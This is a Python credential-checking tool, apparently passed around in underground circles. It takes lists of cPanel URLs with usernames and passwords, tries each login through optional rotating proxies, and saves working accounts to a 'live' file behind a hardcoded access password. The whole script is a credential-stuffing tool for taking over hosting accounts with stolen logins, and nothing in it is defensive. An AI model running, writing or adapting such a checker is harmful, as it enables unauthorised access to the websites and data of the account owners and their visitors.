import requests
import sys
import os
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

# Password for access
PASSWORD = "error_404_cpa"

def password_prompt():
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print(r"""
    ███████╗██████╗ ██████╗  ██████╗ ██████╗     ███████╗███████╗
    ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗    ██╔════╝██╔════╝
    █████╗  ██████╔╝██████╔╝██║   ██║██████╔╝    █████╗  █████╗  
    ██╔══╝  ██╔═══╝ ██╔═══╝ ██║   ██║██╔═══╝     ██╔══╝  ██╔══╝  
    ███████╗██║     ██║     ╚██████╔╝██║         ███████╗███████╗
    ╚══════╝╚═╝     ╚═╝      ╚═════╝ ╚═╝         ╚══════╝╚══════╝
    """)
    print("PRESTIGE BUILT by : @error_404_ma")
    user_input = input("Enter Password to Access: ").strip()
    if user_input != PASSWORD:
        print(f"{Fore.RED}Access Denied! Incorrect Password.")
        sys.exit(1)

def choose_proxy():
    print(f"{Fore.CYAN}Choose Proxy Type: HTTP, SOCKS4, SOCKS5, or None")
    proxy_type = input("Proxy Type: ").strip().upper()
    if proxy_type not in ["HTTP", "SOCKS4", "SOCKS5", "NONE"]:
        print(f"{Fore.RED}Invalid Proxy Type. Please restart.")
        sys.exit(1)
    return proxy_type

def load_proxies(proxy_file):
    if not os.path.exists(proxy_file):
        print(f"{Fore.RED}Proxy file not found: {proxy_file}")
        sys.exit(1)
    with open(proxy_file, "r") as file:
        return [line.strip() for line in file]

def test_cpanel(url, username, password, proxy=None):
    login_url = f"{url}/login/"
    data = {"user": username, "pass": password}
    try:
        response = requests.post(login_url, data=data, proxies=proxy, timeout=10)
        if "cpanel" in response.text.lower():
            return True
    except Exception:
        pass
    return False

def main():
    password_prompt()
    cplist_file = input("Enter cPanel list file (URL|USERNAME|PASSWORD format): ").strip()
    if not os.path.exists(cplist_file):
        print(f"{Fore.RED}File not found: {cplist_file}")
        sys.exit(1)

    proxy_type = choose_proxy()
    proxies = None
    if proxy_type != "NONE":
        proxy_file = input("Enter proxy file: ").strip()
        proxies = load_proxies(proxy_file)
    
    thread_count = int(input("Enter number of threads: ").strip())
    print(f"{Fore.GREEN}Starting cPanel Checker...")

    with open(cplist_file, "r") as file:
        lines = file.readlines()
    
    live_accounts = []
    for line in lines:
        url, username, password = line.strip().split("|")
        proxy = None
        if proxies:
            proxy = {"http": f"{proxy_type.lower()}://{proxies.pop(0)}"}

        is_live = test_cpanel(url, username, password, proxy)
        if is_live:
            print(f"{Fore.GREEN}LIVE: {url}|{username}|{password}")
            live_accounts.append(f"{url}|{username}|{password}")
        else:
            print(f"{Fore.RED}DEAD: {url}|{username}|{password}")
    
    # Save live accounts
    with open("live-cPanel.txt", "w") as live_file:
        live_file.writelines("\n".join(live_accounts))
    
    print(f"{Fore.GREEN}Finished. LIVE accounts saved to live-cPanel.txt")

if __name__ == "__main__":
    main()
